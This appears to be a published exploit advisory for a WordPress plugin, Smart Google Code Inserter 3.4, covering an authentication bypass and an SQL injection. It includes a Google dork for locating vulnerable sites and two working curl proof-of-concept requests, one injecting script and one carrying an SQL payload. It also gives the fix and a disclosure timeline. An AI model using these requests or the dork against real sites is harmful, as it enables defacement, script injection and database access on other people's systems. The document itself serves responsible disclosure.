@@ -1,0 +1,65 @@
+Exploit Title: Smart Google Code Inserter < 3.5 - Auth Bypass/SQLi
+Google Dork: inurl:wp-content/plugins/smart-google-code-inserter/
+Date: 26-Nov-17
+Exploit Author: Benjamin Lim
+Vendor Homepage: http://oturia.com/
+Software Link: https://wordpress.org/plugins/smart-google-code-inserter/
+Version: 3.4
+Tested on: Kali Linux 2.0
+CVE : CVE-2018-3810 (Authentication Bypass with resultant XSS)
+CVE : CVE-2018-3811 (SQL Injection)
+
+
+1. Product & Service Introduction:
+==================================
+Smart Google Code Inserter is a Wordpress plugin that makes it easy to add
+Google Analytics tracking code as well as meta tag verification of
+Webmaster Tools. As of now, the plugin has been downloaded 34,207 times and
+has 9,000+ active installs.
+
+2. Technical Details & Description:
+===================================
+Authentication Bypass vulnerability in the Smart Google Code Inserter
+plugin 3.4 allows unauthenticated attackers to insert arbitrary javascript
+or HTML code which runs on all pages served by Wordpress. The
+saveGoogleCode() function in smartgooglecode.php does not check if the
+current request is made by an authorized user, thus allowing any
+unauthenticated user to successfully update the inserted code.
+
+SQL Injection vulnerability, when coupled with the Authentication Bypass
+vulnerability in the Smart Google Code Inserter plugin 3.4 allows
+unauthenticated attackers to execute SQL queries in the context of the
+webserver. The saveGoogleAdWords() function in smartgooglecode.php did not
+use prepared statements and did not sanitize the $_POST["oId"] variable
+before passing it as input into the SQL query.
+
+3. Proof of Concept (PoC):
+==========================
+
+Code Insertion
+
+curl -k -i --raw -X POST -d
+"sgcgoogleanalytic=<script>alert("1");</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode"
+"http://localhost/wp-admin/options-general.php?page=smartcode" -H "Host:
+localhost" -H "Content-Type: application/x-www-form-urlencoded"
+
+SQL Injection
+
+curl -k -i --raw -X POST -d "action=saveadwords&delconf=1&oId[]=1 OR
+1=1--&ppccap[]=ex:mywplead&ppcpageid[]=1&ppccode[]=bb&nchkdel1=on" "
+http://localhost/wp-admin/options-general.php?page=smartcode" -H "Host:
+localhost" -H "Content-Type: application/x-www-form-urlencoded"
+
+4. Mitigation
+=============
+Update to version 3.5
+
+5. Disclosure Timeline
+======================
+2017/11/29 Vendor contacted
+2017/11/30 Vendor acknowleged and released an update
+2018/01/01 Advisory released to the public
+
+6. Credits & Authors:
+=====================
+Benjamin Lim - [https://limbenjamin.com]
